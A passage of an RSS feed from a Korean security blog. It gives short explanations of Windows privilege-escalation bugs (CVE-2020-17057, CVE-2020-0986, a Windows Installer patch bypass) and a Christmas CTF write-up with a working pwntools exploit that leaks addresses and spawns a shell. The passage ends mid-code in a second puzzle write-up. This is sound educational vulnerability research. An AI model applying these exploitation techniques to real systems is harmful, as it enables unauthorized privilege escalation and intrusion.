      <guid>https://hackyboiz.github.io/2021/01/01/l0ch/2021-01-01/</guid>
      <pubDate>Fri, 01 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blogs.360.cn/post/CVE-2020-17057%20detail%20and%2</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17057%20detail%20and%20exploit.html">CVE-2020-17057 Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft가 2년 전에 발견한 취약점을 패치함으로써 취약점의 세부 정보가 공개되었습니다. 해당 취약점은 Windows 커널 모드의 그래픽 구성 요소인 <code>DirectComposition</code> 에서 발생하는 초기화되지 않은 pool 메모리 참조입니다.</p><p><code>DirectComposition</code> 은 리소스 생성/해제/속성 설정 등의 작업을 수행하는 <code>NtDCompositionProcessChannelBatchBuffer</code> syscall을 사용합니다.</p><p><code>DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> 에서는 한 쌍의 리소스 객체를 처리합니다. 첫 번째 리소스 객체가 초기화되고 두 번째 리소스 객체 타입이 <code>0x57</code>이 아니라면 두 번째 리소스 객체가 초기화되지 않습니다.</p><p>이후 <code>DirectComposition::CInteractionTrackerMarshaler::ReleaseManipulationReferences</code> 에서 할당된 한 쌍의 리소스 객체를 해제하기 위해 별도의 검증 없이<code>DirectComposition::CApplicationChannel::ReleaseResource</code> 을 호출하는데, 이때 초기화되지 않은 두 번째 리소스 객체 포인터를 참조하게 되어 커널 크래시가 발생합니다.</p><p>이를 악용하면 리소스 객체 포인터 테이블을 spray 해 임의 객체를 해제하는 등 해제된 메모리를 조작할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/uninitialized-pointer/">uninitialized pointer</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/01/l0ch/2021-01-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-0986: Windows splWOW64 Elevation of Privilege</title>
      <link>https://hackyboiz.github.io/2020/12/31/idioth/2020-12-31/</link>
      <guid>https://hackyboiz.github.io/2020/12/31/idioth/2020-12-31/</guid>
      <pubDate>Thu, 31 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2096">Issue 2096: Windows: splWOW64 Elevation of Privilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 2004 (19041.508)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>5월에 Kaspersky는 Windows splWOW64의 Elevation of Privilege가 악용되고 있음을 발견했습니다. Microsoft에서 6월에 패치를 발표했지만 해당 취약점은 수정되지 않았습니다.</p><p>CVE-2020-0986은 GDI Print/Print Spooler API의 arbitrary pointer 역참조 취약점입니다. 이 취약점을 이용하여 low integrity 프로세스는 splwow64.exe(medium integrity)에 LPC 메시지를 보내 splwow64의 메모리 영역에 쓰기 권한을 얻을 수 있습니다. </p><p>splWOW64는 <code>GdiPrinterThunk</code>로 LPC 메시지를 전달합니다. <code>GdiPrinterThunk</code>의 <code>INDEX_DocumnetEvent</code>에 해당 취약점이 포함되어 있습니다. <code>INDEX_DocumentEvent</code>의 핸들러는 printer command(LPC 클라이언트를 통해 조작 가능)를 통해 유효한 핸들을 가진 프린터의 명령인지 확인합니다.</p><p>확인하고 나면 <code>DecodePointer</code> 함수를 사용하여 <code>fpDocumnetEvent</code>의 전역 변수에 저장된 함수의 포인터를 decode 한 후 decode 된 포인터를 통해 함수를 실행하고 <code>memcpy</code>를 호출합니다. 해커는 <code>memcpy</code>를 통해 복사되는 내용과 바이트 수, destination을 제어할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==</a></p><p><a href="https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/">https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/splwow64/">splwow64</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-pointer-dereference/">arbitrary pointer dereference</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpc/">lpc</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/31/idioth/2020-12-31/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Windows Installer EoP 6th patch bypass</title>
      <link>https://hackyboiz.github.io/2020/12/30/fabu1ous/2020-12-30/</link>
      <guid>https://hackyboiz.github.io/2020/12/30/fabu1ous/2020-12-30/</guid>
      <pubDate>Wed, 30 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://halove23.blogspot.com/2020/12/oh-so-you-have-anti</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://halove23.blogspot.com/2020/12/oh-so-you-have-antivirus-nameevery-bug.html">Disclosing about 8 0-day vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows installer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://hackyboiz.github.io/2020/10/21/fabu1ous/2020-10-21/">CVE-2020-16902</a>에 대한 패치 우회가 공개되었습니다. CVE-2019-1415로 처음 제보된 Windows Installer EoP 취약점의 6번째 패치 우회입니다. </p><p>CVE-2020-16902의 내용은 다음과 같습니다. Windows Installer는 설치 작업 실패를 대비해 설치 작업 중 삭제되는 파일과 롤백 스크립트를<code> C:\Config.Msi</code> 디렉터리에 백업합니다. 백업 전에 <code>C:\Config.Msi</code> 디렉터리를 삭제하고 재생성하는 로직이 있는데 <code>Setsecurity()</code>의 race condition 취약점 패턴이 남아있어 악용이 가능합니다.</p><p>따라서 <code>C:\Config.Msi</code>를 삭제하고 <code>C:\Config.Msi</code>이 여전히 존재한다면(race-con 트리거 조건) <code>C:\Config.Msi</code> 대신 <code>C:\windows\install\config.msi</code>에 롤백 파일을 백업하도록 패치되었습니다. </p><p>하지만 다음과 같은 이유로 우회가 가능합니다. 만약 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키가 존재하면 그대로 <code>C:\Config.Msi</code>를 백업에 사용합니다.  <code>C:\Config.Msi</code>를 삭제한 후 <code>C:\Config.Msi</code>의 삭제 여부를 한번 더 체크한 다음 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키를 삭제합니다.  <code>C:\Config.Msi</code>가 삭제된 직후 <code>C:\Config.Msi</code>를 생성하면 레지스트리 키가 삭제되지 않습니다. Windows Installer는 <code>C:\Config.Msi</code>를 백업에 사용하게 되고 이전 취약점들을 그대로 악용할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/race-condition/">race condition</category>
      
      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/30/fabu1ous/2020-12-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - Match Maker</title>
      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;문제-개요&quot;&gt;&lt;a href=&quot;#문제-개요&quot; class=&quot;headerlink&quot; title=&quot;문제 개요&quot;&gt;&lt;/a&gt;문제 개요&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/12/29/fabu1ous/match-maker/1.png&quot;&gt;&lt;/p&gt;
&lt;ol</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png"></p><ol><li><p>프로필을 만듭니다.</p><ul><li>이름, 나이, 성별, 취미를 입력</li><li>나이 정보에 따라 파트너 매칭 함수가 달라짐</li></ul></li><li><p>만든 프로필을 저장합니다.</p><ul><li>만들어진 프로필을 힙에 저장</li><li>성별을 구분하여 전역 배열에 힙 주소 저장.</li></ul></li><li><p>파트너 매칭을 합니다.</p></li><li><p>매칭 된 파트너의 정보를 출력합니다.</p></li><li><p>유저 리스트를 출력합니다.</p><ul><li>현재 프로필이 남자면 여자 리스트를 출력</li><li>현재 프로필이 여자면 남자 리스트를 출력</li></ul></li></ol><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p>find match 기능에서 사용할 알고리즘을 정하는 로직이 존재합니다. pref_min_age != pref_max_age이면서 pref_min_age ^ 2 == pref_max_age ^ 2 일 때 초기화되지 않은 스택의 쓰레기 값으로 rip를 조작할 수 있습니다. int-overflow를 활용하면 됩니다.</p><p>show user list 기능에서 user list를 참조할 때 sex ^1을 index로 사용합니다. 프로필 작성 시 성별 입력값에 제한이 없기 때문에 이를 이용해 바이너리 base주소와 libc base 주소를 얻을 수 있습니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>int overflow → uninitialized stack</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/2.png"></p><p>프로필 생성 메뉴에서 입력받은 나이 정보를 토대로 파트너 매칭 루틴을 정하는 코드입니다. if…else가 아닌 if…if 이므로 integer overflow를 발생시켜 <code>(void*)func()</code>의 값을 스택에 있던 쓰레기 값으로 설정할 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/3.png"></p><p>연상 혹은 연하 중 선호하는 쪽을 계산하는 루틴에서 절댓값을 사용합니다. 입력할 수 있는 나이에 최댓값 제한이 없기 때문에 int overflow를 발생시켜 스택 변수 <code>(void*)func()를</code> 초기화하는 작업을 건너뛸 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/4.png"></p><p><code>(void*)func()</code>값에 영향을 미치는 쓰레기 값은 name을 입력받을 때 사용하던 버퍼입니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/5.png"></p><p>메인 메뉴에서 find match를 선택하면 rip가 잡히는 것을 확인할 수 있습니다.</p><ul><li>out of bound read</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/6.png"></p><p>성별은 int로 입력받습니다.</p><p>0 : 남자</p><p>1 : 여자</p><p><img src="/2020/12/29/fabu1ous/match-maker/7.png"></p><p>현재 프로필이 남자면 여자 유저 리스트를, 여자면 남자 리스트를 출력해주는 함수입니다. 0도 1도 아닌 다른 값을 성별로 입력하면 oob-read가 가능합니다. binary의 base주소, libc의 base주소를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./match&#x27;</span>)<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>, age)p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)p.sendlineafter(<span class="hljs-string">&#x27;min age limit for you: &#x27;</span>, Pmin)p.sendlineafter(<span class="hljs-string">&#x27;max age limit for you: &#x27;</span>, Pmax)p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, sex)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 1 : &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 2 : &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 3 : &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-comment"># leak bin base</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;-2&#x27;</span>)showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)bin_base = leak - <span class="hljs-number">0x5008</span>log.info(hex(bin_base))<span class="hljs-comment"># leak read@libc</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&#x27;BBBBBBBBCCCCCCCC&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)save()showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)system = leak - <span class="hljs-number">0xbbd20</span>log.info(hex(system))make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)find()p.interactive()</code></pre><pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done[*] 0x55ad3a345000[*] 0x7f414a9ec410[*] Switching to interactive mode$ cat flagXMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      <category domain="https://hackyboiz.github.io/tags/uninitialized-stack/">uninitialized stack</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - No g</title>
      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/no-g/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/no-g/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;문제-개요&quot;&gt;&lt;a href=&quot;#문제-개요&quot; class=&quot;headerlink&quot; title=&quot;문제 개요&quot;&gt;&lt;/a&gt;문제 개요&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/12/29/fabu1ous/no-g/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;음계(Scal</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/no-g/1.png"></p><p>음계(Scale)를 알파벳으로 나타내곤 합니다. 음이름이라고 하죠.</p><p>라(A), 시(B), 도(C), 레(D), 미(E) , 파(F), 솔(G)</p><p>16진수(HEX) 또한 알파벳을 사용해 수를 표현합니다.</p><p>10(A), 11(B), 12(C), 13(D), 14(E), 15(F)</p><p><img src="/2020/12/29/fabu1ous/no-g/hint.jpg"></p><p>악보에 그려진 음표를 알파벳으로, 그 알파벳을 hex값으로 치환하고 연결된 음표들끼리 hex값을 더해 ASCII로 변환하면 하나의 문자가 됩니다.</p><p>예 ) 라라라 → chr(0xa+0xa+0xa) → ‘\x1e’</p><p>hex에는 G가 없기 때문에 악보의 제목이 ‘No G’입니다. </p><p>제가 의도한 풀이 접근 방식은 이렇습니다.</p><ol><li>제목에서 힌트를 얻어 음이름을 찾아본다.</li><li>첫 여섯 음의 hex값을 더해봤더니 ‘X’가 나온다.</li><li>flag 형식이 ‘XMAS{}’이므로 2번 과정을 몇 번 더 반복해 본다.</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs python">note = [<span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>]idx = [<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span 